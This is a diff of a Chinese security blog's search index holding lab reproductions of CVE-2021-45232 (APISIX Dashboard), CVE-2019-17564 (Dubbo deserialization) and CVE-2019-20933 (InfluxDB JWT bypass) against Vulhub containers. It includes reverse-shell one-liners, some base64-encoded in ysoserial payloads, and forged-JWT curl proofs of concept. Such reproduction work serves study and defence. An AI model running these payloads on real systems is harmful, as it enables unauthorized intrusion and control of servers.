@@ -1,77 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232</title>
-    <url>/2022/08/21/Apache%20APISIX%20Dashboard%20API%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4RCE%20CVE-2021-45232/</url>
-    <content><![CDATA[<blockquote>
-<p>Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。</p>
-<p>Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p>
-</blockquote>
-<a id="more"></a>
-<p>执行如下命令启动一个有漏洞的Apache APISIX Dashboard 2.9：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">或者</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>然后访问<code>http://your-ip:9000/</code>即可看到Apache APISIX Dashboard的登录页面。</p>
-<p><a href="http://123.56.181.14:9000/" target="_blank" rel="noopener">http://123.56.181.14:9000/</a></p>
-<p><img src="/images/image-20230904155040326.png" alt="image-20230904155040326"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\apisix_dashboard_rce.py http://123.56.181.14:9000</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230904160151577.png" alt="image-20230904160151577"></p>
-<p><img src="/images/image-20230904161034138.png" alt="image-20230904161034138"></p>
-<p>可见在Header中添加的<code>CMD</code>头中的命令已被执行</p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机nc监听</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
-<p>burp中发送数据包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CMD: bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230904161342557.png" alt="image-20230904161342557"></p>
-<p>点击send，反弹成功</p>
-<p><img src="/images/image-20230904161508959.png" alt="image-20230904161508959"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</title>
-    <url>/2023/09/05/Aapche%20Dubbo%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/</url>
-    <content><![CDATA[<p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。RPC，全称为Remote Procedure Call，即远程过程调用，它是一个计算机通信协议。它允许像调用本地服务一样调用远程服务。</p>
-<p>Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p>
-<a id="more"></a>
-<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Dubbo 2.7.4及以前版本</span><br></pre></td></tr></table></figure>
-<p>Apache Dubbo 2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个Apache Dubbo 2.7.3 Provider：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/dubbo/CVE-2019-17564/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>服务启动后，访问<code>http://your-ip:8080</code>，服务器默认会返回500错误。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p>
-<p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，本地下载<a href="https://zookeeper.apache.org/" target="_blank" rel="noopener">Zookeeper</a>，使用其中自带的<strong>zkCli</strong>即可连接到这台Zookeeper服务器。</p>
-<p>依次执行以下命令下载、解压、使用zkCli工具：</p>
-<blockquote>
-<p>记得把2181加入安全组，所有ip都能访问</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget https://dlcdn.apache.org/zookeeper/zookeeper-3.7.1/apache-zookeeper-3.7.1-bin.tar.gz --no-check-certificate</span><br><span class="line">或者</span><br><span class="line">wget https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ tar xvf apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ cd apache-zookeeper-3.7.0-bin/bin</span><br><span class="line">$ ./zkCli.sh -server target-ip:2181</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230905150644982.png" alt="image-20230905150644982"></p>
-<p><img src="/images/image-20230905150745040.png" alt="image-20230905150745040"></p>
-<p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p>
-<p><img src="/images/image-20230905153725509.png" alt="image-20230905153725509"></p>
-<p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;touch /tmp/awesome_poc&quot; &gt; 1.poc</span><br><span class="line"></span><br><span class="line">$ curl -XPOST --data-binary @1.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230905154734165.png" alt="image-20230905154734165"></p>
-<p>进入docker，命令<code>touch /tmp/awesome_poc</code>执行成功：</p>
-<p><img src="/images/image-20230905154826790.png" alt="image-20230905154826790"></p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br><span class="line"># base64编码</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; shell.poc</span><br><span class="line">$ curl -XPOST --data-binary @shell.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230905160303151.png" alt="image-20230905160303151"></p>
-<p><img src="/images/image-20230905155920271.png" alt="image-20230905155920271"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Java反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）</title>
     <url>/2022/09/05/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/</url>
     <content><![CDATA[<p>Apache ActiveMQ 是一个流行的、开源的、跨语言的消息队列 (MQ) 项目，它是 Apache 基金会下的顶级项目之一。ActiveMQ 支持多种协议和编程语言，包括 Java、C++、Python、PHP、Ruby、Perl、.NET 等。它提供了一种可靠的异步通信方式，用于在分布式系统中传递消息。由于其卓越的性能、可靠性和易用性，ActiveMQ 成为了很多企业和组织在构建大型分布式应用和微服务架构时的首选消息队列软件之一。</p>
@@ -120,6 +49,77 @@
       </categories>
       <tags>
         <tag>Java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</title>
+    <url>/2023/09/05/Aapche%20Dubbo%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/</url>
+    <content><![CDATA[<p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。RPC，全称为Remote Procedure Call，即远程过程调用，它是一个计算机通信协议。它允许像调用本地服务一样调用远程服务。</p>
+<p>Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p>
+<a id="more"></a>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Dubbo 2.7.4及以前版本</span><br></pre></td></tr></table></figure>
+<p>Apache Dubbo 2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个Apache Dubbo 2.7.3 Provider：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/dubbo/CVE-2019-17564/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>服务启动后，访问<code>http://your-ip:8080</code>，服务器默认会返回500错误。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p>
+<p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，本地下载<a href="https://zookeeper.apache.org/" target="_blank" rel="noopener">Zookeeper</a>，使用其中自带的<strong>zkCli</strong>即可连接到这台Zookeeper服务器。</p>
+<p>依次执行以下命令下载、解压、使用zkCli工具：</p>
+<blockquote>
+<p>记得把2181加入安全组，所有ip都能访问</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget https://dlcdn.apache.org/zookeeper/zookeeper-3.7.1/apache-zookeeper-3.7.1-bin.tar.gz --no-check-certificate</span><br><span class="line">或者</span><br><span class="line">wget https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ tar xvf apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ cd apache-zookeeper-3.7.0-bin/bin</span><br><span class="line">$ ./zkCli.sh -server target-ip:2181</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230905150644982.png" alt="image-20230905150644982"></p>
+<p><img src="/images/image-20230905150745040.png" alt="image-20230905150745040"></p>
+<p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p>
+<p><img src="/images/image-20230905153725509.png" alt="image-20230905153725509"></p>
+<p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;touch /tmp/awesome_poc&quot; &gt; 1.poc</span><br><span class="line"></span><br><span class="line">$ curl -XPOST --data-binary @1.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230905154734165.png" alt="image-20230905154734165"></p>
+<p>进入docker，命令<code>touch /tmp/awesome_poc</code>执行成功：</p>
+<p><img src="/images/image-20230905154826790.png" alt="image-20230905154826790"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br><span class="line"># base64编码</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; shell.poc</span><br><span class="line">$ curl -XPOST --data-binary @shell.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230905160303151.png" alt="image-20230905160303151"></p>
+<p><img src="/images/image-20230905155920271.png" alt="image-20230905155920271"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232</title>
+    <url>/2022/08/21/Apache%20APISIX%20Dashboard%20API%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4RCE%20CVE-2021-45232/</url>
+    <content><![CDATA[<blockquote>
+<p>Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。</p>
+<p>Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p>
+</blockquote>
+<a id="more"></a>
+<p>执行如下命令启动一个有漏洞的Apache APISIX Dashboard 2.9：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">或者</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>然后访问<code>http://your-ip:9000/</code>即可看到Apache APISIX Dashboard的登录页面。</p>
+<p><a href="http://123.56.181.14:9000/" target="_blank" rel="noopener">http://123.56.181.14:9000/</a></p>
+<p><img src="/images/image-20230904155040326.png" alt="image-20230904155040326"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\apisix_dashboard_rce.py http://123.56.181.14:9000</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230904160151577.png" alt="image-20230904160151577"></p>
+<p><img src="/images/image-20230904161034138.png" alt="image-20230904161034138"></p>
+<p>可见在Header中添加的<code>CMD</code>头中的命令已被执行</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机nc监听</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+<p>burp中发送数据包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CMD: bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230904161342557.png" alt="image-20230904161342557"></p>
+<p>点击send，反弹成功</p>
+<p><img src="/images/image-20230904161508959.png" alt="image-20230904161508959"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -194,72 +194,6 @@
       </categories>
       <tags>
         <tag>Java反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）</title>
-    <url>/2022/11/10/InfluxDB%20JWT%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-20933%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>InfluxDB是一款著名的时序数据库，其使用jwt作为鉴权方式。</p>
-<p><strong>在其1.7.6版本以前</strong>，默认设置jwt的认证密钥<code>shared-secret</code>为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。</p>
-<a id="more"></a>
-<blockquote>
-<p>InfluxDB是一种高性能、分布式的时序数据库，旨在处理大量的时间序列数据，并支持快速查询和高效存储。它支持SQL类似的查询语言，使用户可以轻松地进行实时分析和基于时间序列的数据可视化。</p>
-<p>以下是 InfluxDB 的主要特点：</p>
-<ol>
-<li>高性能：InfluxDB 采用了专门为时间序列数据而设计的高效存储引擎，提供了出色的写入和查询性能，可以轻松处理海量的时序数据。</li>
-<li>分布式架构：InfluxDB 支持水平扩展，可以在多个节点之间分布数据，以提高性能和可靠性。此外，它还提供了数据复制和故障转移功能，以确保数据的高可用性和可靠性。</li>
-<li>SQL 类似的查询语言：InfluxDB 支持 InfluxQL 查询语言，通过简单的 SQL 类似的语法，可以轻松地查询和过滤大量的时序数据。它还提供了聚合和分组等强大的查询功能，能够灵活地处理不同的查询需求。</li>
-<li>数据可视化：InfluxDB 提供了 Grafana 等多种数据可视化工具的插件支持，可以方便地进行基于时间序列的数据可视化和报表生成。</li>
-<li>支持数据采集：InfluxDB 支持多种数据采集端，如 Telegraf、Fluentd 等，在实时场景中可以灵活地收集和处理各种数据来源，如系统指标、日志、传感器数据等。</li>
-</ol>
-<p>总体而言，InfluxDB 是一种功能强大、性能出色的时序数据库，广泛应用于物联网、分布式系统、应用监控等领域。它支持多种数据源，提供了强大的查询和可视化功能，通过水平扩展和高可用性的架构，保证了海量数据的高效处理和存储。</p>
-</blockquote>
-<p>参考链接：</p>
-<ul>
-<li><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">https://www.komodosec.com/post/when-all-else-fails-find-a-0-day</a></li>
-<li><a href="https://github.com/influxdata/influxdb/issues/12927" target="_blank" rel="noopener">influxdata/influxdb#12927</a></li>
-<li><a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" target="_blank" rel="noopener">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a></li>
-<li><a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings" target="_blank" rel="noopener">https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings</a></li>
-<li><a href="http://www.mi1k7ea.com/2020/01/01/%E6%B5%85%E6%9E%90Influxdb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.mi1k7ea.com/2020/01/01/%E6%B5%85%E6%9E%90Influxdb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</a></li>
-</ul>
-<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动InfluxDB 1.6.6：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/influxdb/CVE-2019-20933/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-<p>环境启动后，访问<code>http://your-ip:8086/debug/vars</code>即可查看一些服务信息，但此时执行SQL语句则会出现401错误：</p>
-<p><img src="/images/image-20230910154220469.png" alt="image-20230910154220469"></p>
-<p><img src="/images/image-20230910162422082.png" alt="image-20230910162422082" style="zoom:80%;"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>信息搜集</strong></p>
-<p>先确定版本号是否存在漏洞，版本 &lt; 1.7.6，是存在认证绕过漏洞的版本：</p>
-<p><img src="/images/image-20230910162633445.png" alt="image-20230910162633445"></p>
-<p>判断Influxdb服务绑定的端口号以及是否在公网进行监听：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -pantu</span><br><span class="line">netstat -pantu | grep influx</span><br></pre></td></tr></table></figure>
-<p>默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。</p>
-<p><strong>漏洞利用</strong></p>
-<p>输入如下命令进行用户名发现：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G &apos;http://123.56.181.14:8086/debug/requests&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910164737834.png" alt="image-20230910164737834"></p>
-<p>可以看到并没有返回数据库相关的用户名。</p>
-<p>InfluxDB具有Web管理界面，其存在一个默认的admin用户名，利用该用户名生成JSON Web Token后即可绕过认证，获得完整的用户权限，可以任意执行增删改等数据库操作。</p>
-<p>我们借助<a href="https://jwt.io/来生成jwt" target="_blank" rel="noopener">https://jwt.io/来生成jwt</a> token：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;exp&quot;: 1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，需要设置为一个未来的时间戳。</p>
-<p>最终生成的token：</p>
-<p><img src="/images/image-20230910163906331.png" alt="image-20230910163906331"></p>
-<p>发送带有这个jwt token的数据包，可见SQL语句执行成功：</p>
-<p><img src="/images/image-20230910164310613.png" alt="image-20230910164310613"></p>
-<p>POC如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G -X POST &apos;http://123.56.181.14:8086/query&apos; --data-urlencode &apos;q=show users&apos; -H &apos;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k&apos;</span><br></pre></td></tr></table></figure>
-<p>利用效果如图，成功查询得到用户信息：</p>
-<p><img src="/images/image-20230910165023287.png" alt="image-20230910165023287"></p>
-<p>修改下PoC的利用方式，添加新的数据库：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G -X POST &apos;http://123.56.181.14:8086/query&apos; --data-urlencode &apos;q=create database hacked&apos; -H &apos;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk0MzM2NjYwfQ.ppl2b6_ddlOMionww8zs5x29EB2d2khQgNP1wWVQg6s&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910165748830.png" alt="image-20230910165748830"></p>
-<p>远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>JWT认证绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -407,6 +341,72 @@
       </tags>
   </entry>
   <entry>
+    <title>InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）</title>
+    <url>/2022/11/10/InfluxDB%20JWT%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-20933%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>InfluxDB是一款著名的时序数据库，其使用jwt作为鉴权方式。</p>
+<p><strong>在其1.7.6版本以前</strong>，默认设置jwt的认证密钥<code>shared-secret</code>为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。</p>
+<a id="more"></a>
+<blockquote>
+<p>InfluxDB是一种高性能、分布式的时序数据库，旨在处理大量的时间序列数据，并支持快速查询和高效存储。它支持SQL类似的查询语言，使用户可以轻松地进行实时分析和基于时间序列的数据可视化。</p>
+<p>以下是 InfluxDB 的主要特点：</p>
+<ol>
+<li>高性能：InfluxDB 采用了专门为时间序列数据而设计的高效存储引擎，提供了出色的写入和查询性能，可以轻松处理海量的时序数据。</li>
+<li>分布式架构：InfluxDB 支持水平扩展，可以在多个节点之间分布数据，以提高性能和可靠性。此外，它还提供了数据复制和故障转移功能，以确保数据的高可用性和可靠性。</li>
+<li>SQL 类似的查询语言：InfluxDB 支持 InfluxQL 查询语言，通过简单的 SQL 类似的语法，可以轻松地查询和过滤大量的时序数据。它还提供了聚合和分组等强大的查询功能，能够灵活地处理不同的查询需求。</li>
+<li>数据可视化：InfluxDB 提供了 Grafana 等多种数据可视化工具的插件支持，可以方便地进行基于时间序列的数据可视化和报表生成。</li>
+<li>支持数据采集：InfluxDB 支持多种数据采集端，如 Telegraf、Fluentd 等，在实时场景中可以灵活地收集和处理各种数据来源，如系统指标、日志、传感器数据等。</li>
+</ol>
+<p>总体而言，InfluxDB 是一种功能强大、性能出色的时序数据库，广泛应用于物联网、分布式系统、应用监控等领域。它支持多种数据源，提供了强大的查询和可视化功能，通过水平扩展和高可用性的架构，保证了海量数据的高效处理和存储。</p>
+</blockquote>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">https://www.komodosec.com/post/when-all-else-fails-find-a-0-day</a></li>
+<li><a href="https://github.com/influxdata/influxdb/issues/12927" target="_blank" rel="noopener">influxdata/influxdb#12927</a></li>
+<li><a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" target="_blank" rel="noopener">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a></li>
+<li><a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings" target="_blank" rel="noopener">https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings</a></li>
+<li><a href="http://www.mi1k7ea.com/2020/01/01/%E6%B5%85%E6%9E%90Influxdb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.mi1k7ea.com/2020/01/01/%E6%B5%85%E6%9E%90Influxdb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</a></li>
+</ul>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动InfluxDB 1.6.6：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/influxdb/CVE-2019-20933/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+<p>环境启动后，访问<code>http://your-ip:8086/debug/vars</code>即可查看一些服务信息，但此时执行SQL语句则会出现401错误：</p>
+<p><img src="/images/image-20230910154220469.png" alt="image-20230910154220469"></p>
+<p><img src="/images/image-20230910162422082.png" alt="image-20230910162422082" style="zoom:80%;"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>信息搜集</strong></p>
+<p>先确定版本号是否存在漏洞，版本 &lt; 1.7.6，是存在认证绕过漏洞的版本：</p>
+<p><img src="/images/image-20230910162633445.png" alt="image-20230910162633445"></p>
+<p>判断Influxdb服务绑定的端口号以及是否在公网进行监听：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -pantu</span><br><span class="line">netstat -pantu | grep influx</span><br></pre></td></tr></table></figure>
+<p>默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。</p>
+<p><strong>漏洞利用</strong></p>
+<p>输入如下命令进行用户名发现：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -G &apos;http://123.56.181.14:8086/debug/requests&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910164737834.png" alt="image-20230910164737834"></p>
+<p>可以看到并没有返回数据库相关的用户名。</p>
+<p>InfluxDB具有Web管理界面，其存在一个默认的admin用户名，利用该用户名生成JSON Web Token后即可绕过认证，获得完整的用户权限，可以任意执行增删改等数据库操作。</p>
